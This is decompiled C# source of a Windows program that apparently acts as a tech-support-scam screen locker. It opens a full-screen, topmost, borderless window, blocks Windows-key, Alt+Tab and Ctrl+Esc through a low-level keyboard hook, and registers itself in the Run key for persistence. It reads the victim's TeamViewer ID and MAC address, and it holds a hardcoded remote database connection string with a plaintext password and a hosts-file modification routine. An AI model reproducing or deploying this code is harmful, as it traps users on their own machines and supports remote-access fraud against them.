using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using cheze.Properties;

namespace cheze;

public class Form1 : Form
{
	private struct KBDLLHOOKSTRUCT
	{
		public Keys key;

		public int scanCode;

		public int flags;

		public int time;

		public IntPtr extra;

		public int vkCode;

		public int dwExtraInfo;
	}

	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	private delegate int LowLevelKeyboardProcDelegates(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	private string mac;

	private string pc_locked;

	private string teamviewer;

	private string sMacAddress = string.Empty;

	private string country = "jp";

	private string cp_disable;

	private string taskmanager;

	private string host_file;

	private string Teamviewerstring = string.Empty;

	private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";

	private IntPtr ptrHook;

	private LowLevelKeyboardProc objKeyboardProcess;

	private const int WH_KEYBOARD_LL = 13;

	private int intLLKey;

	private KBDLLHOOKSTRUCT lParam;

	private const int WH_KEYBOARD_LLs = 13;

	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hook);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string name);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern short GetAsyncKeyState(Keys key);

	public static bool ModifyHostsFile(string entry)
	{
		try
		{
			using StreamWriter streamWriter = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts"));
			streamWriter.WriteLine(entry);
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	public Form1()
	{
		InitializeComponent();
		((Control)this).set_Bounds(Screen.get_PrimaryScreen().get_Bounds());
		TID();
		TId();
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		NetworkInterface[] array = allNetworkInterfaces;
		foreach (NetworkInterface networkInterface in array)
		{
			if (sMacAddress == string.Empty)
			{
				networkInterface.GetIPProperties();
				sMacAddress = networkInterface.GetPhysicalAddress().ToString();
			}
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		objKeyboardProcess = captureKey;
		ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(mainModule.ModuleName), 0u);
	}

	private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Invalid comparison between Unknown and I4
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || (int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)1;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private IntPtr workingkey(int nCode, IntPtr wp, IntPtr lp)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Invalid comparison between Unknown and I4
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Invalid comparison between Unknown and I4
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Invalid comparison between Unknown and I4
		if (nCode >= 0)
		{
			KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));
			if ((int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || (int)kBDLLHOOKSTRUCT.key == 92 || (int)kBDLLHOOKSTRUCT.key == 91 || ((int)kBDLLHOOKSTRUCT.key == 9 && HasAltModifier(kBDLLHOOKSTRUCT.flags)) || ((int)kBDLLHOOKSTRUCT.key == 27 && (Control.get_ModifierKeys() & 0x20000) == 131072))
			{
				return (IntPtr)0;
			}
		}
		return CallNextHookEx(ptrHook, nCode, wp, lp);
	}

	private bool HasAltModifier(int flags)
	{
		return (flags & 0x20) == 32;
	}

	private long TId()
	{
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = (Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				return 0L;
			}
			object value = registryKey.GetValue("ClientID");
			Teamviewerstring = value.ToString();
			if (value != null)
			{
				return Convert.ToInt64(value);
			}
			foreach (string item in registryKey.GetSubKeyNames().Reverse())
			{
				value = registryKey.OpenSubKey(item)!.GetValue("ClientID");
				MessageBox.Show(value.ToString());
				if (value != null)
				{
					return Convert.ToInt64(value);
				}
			}
			return 0L;
		}
		catch (Exception)
		{
			return 0L;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("One Click", Application.get_ExecutablePath().ToString());
		((Control)label1).set_Text(Teamviewerstring.Substring(Teamviewerstring.Length - 5));
		((Control)label3).set_Text(sMacAddress.Substring(sMacAddress.Length - 10));
	}

	public static string TID()
	{
		List<string> list = new string[7] { "4", "5", "5.1", "6", "7", "8", "14" }.Reverse().ToList();
		string[] array = new string[2] { "SOFTWARE\\TeamViewer", "SOFTWARE\\Wow6432Node\\TeamViewer" };
		foreach (string text in array)
		{
			if (Registry.LocalMachine.OpenSubKey(text) == null)
			{
				continue;
			}
			foreach (string item in list)
			{
				string name = $"{text}\\Version{item}";
				if (Registry.LocalMachine.OpenSubKey(name) != null)
				{
					object value = Registry.LocalMachine.OpenSubKey(name)!.GetValue("ClientID");
					if (value != null)
					{
						return Convert.ToInt32(value).ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi)]
	private static extern int SetWindowsHookExA(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);

	[DllImport("user32.dll")]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32.dll", CharSet = CharSet.Ansi)]
	private static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	[DllImport("user32.dll", CharSet = CharSet.Ansi)]
	private static extern int SetWindowsHookExs(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);

	[DllImport("user32.dll")]
	private static extern int UnhookWindowsHookExs(int hHook);

	[DllImport("user32.dll", CharSet = CharSet.Ansi)]
	private static extern int CallNextHookExs(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	private int LowLevelKeyboardProcs(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		bool flag = false;
		if ((uint)(wParam - 256) <= 1u || (uint)(wParam - 260) <= 1u)
		{
			if ((lParam.vkCode == 9 && lParam.flags == 32) || (lParam.vkCode == 27 && lParam.flags == 32) || (lParam.vkCode == 27 && lParam.flags == 0) || (lParam.vkCode == 91 && lParam.flags == 1) || (lParam.vkCode == 92 && lParam.flags == 1) || lParam.flags == 32)
			{
				flag = true;
			}
			else if (lParam.vkCode == 77)
			{
				((Form)this).Close();
				flag = false;
			}
		}
		if (flag)
		{
			return 1;
		}
		return CallNextHookEx(0, nCode, wParam, ref lParam);
	}

	private void KeyboardHook(object sender, EventArgs e)
	{
		intLLKey = SetWindowsHookExA(13, LowLevelKeyboardProcs, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
	}

	private void ReleaseKeyboardHook()
	{
		intLLKey = UnhookWindowsHookEx(intLLKey);
	}

	protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		if ((int)keyData == 262259)
		{
			return true;
		}
		if ((int)keyData == 393285)
		{
			((Form)this).Close();
			return false;
		}
		return ((Form)this).ProcessCmdKey(ref msg, keyData);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(label1, "label1");
		((Control)label1).set_BackColor(SystemColors.ActiveCaption);
		((Control)label1).set_Name("label1");
		componentResourceManager.ApplyResources(label2, "label2");
		((Control)label2).set_BackColor(SystemColors.ActiveCaption);
		((Control)label2).set_Name("label2");
		componentResourceManager.ApplyResources(label3, "label3");
		((Control)label3).set_BackColor(SystemColors.ActiveCaption);
		((Control)label3).set_Name("label3");
		componentResourceManager.ApplyResources(label4, "label4");
		((Control)label4).set_BackColor(SystemColors.ActiveCaption);
		((Control)label4).set_Name("label4");
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources._2);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
